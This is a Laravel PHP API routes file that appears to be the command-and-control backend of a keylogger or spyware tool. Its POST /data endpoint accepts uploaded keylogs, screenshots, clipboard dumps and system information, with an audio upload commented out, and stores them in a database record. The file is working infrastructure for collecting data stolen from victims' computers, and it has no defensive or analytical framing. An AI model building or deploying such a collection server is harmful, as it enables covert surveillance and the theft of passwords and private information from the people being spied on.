<?php

use App\Models\info;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

function name($path)
{
    $list = explode('/', $path);
    $name = $list[count($list) - 1];
    return $name;
}

Route::post('/data', function (Request $request) {

    $keylog = name($request->file("keylog")->store('data'));
    $screenshot = name($request->file("screenshot")->store('data'));
    $clipboard = name($request->file("clipboard")->store('data'));
    // $audio = name($request->file("audio")->store('data'));
    $sysinfo = name($request->file("sysinfo")->store('data'));

    $info = new info();
    $info->keylog = $keylog;
    $info->screenshot = $screenshot;
    // $info->audio = $audio;
    $info->clipboard = $clipboard;
    $info->computer_info = $sysinfo;
    $info->save();

    return response($info);
});